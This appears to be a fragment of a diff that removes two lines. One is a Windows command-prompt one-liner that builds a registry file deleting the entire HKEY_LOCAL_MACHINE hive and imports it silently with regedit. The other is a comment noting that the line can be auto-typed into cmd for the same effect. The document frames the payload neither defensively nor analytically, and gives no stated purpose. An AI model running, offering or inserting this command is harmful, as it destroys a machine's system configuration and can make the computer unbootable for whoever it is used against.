@@ -1,2 +1,0 @@
-echo Windows Registry Editor Version 5.00>f&echo.>>f&echo [-HKEY_LOCAL_MACHINE]>>f&regedit /s f&exit
-# Note: U can autotype the above line into a cmd and it does the same
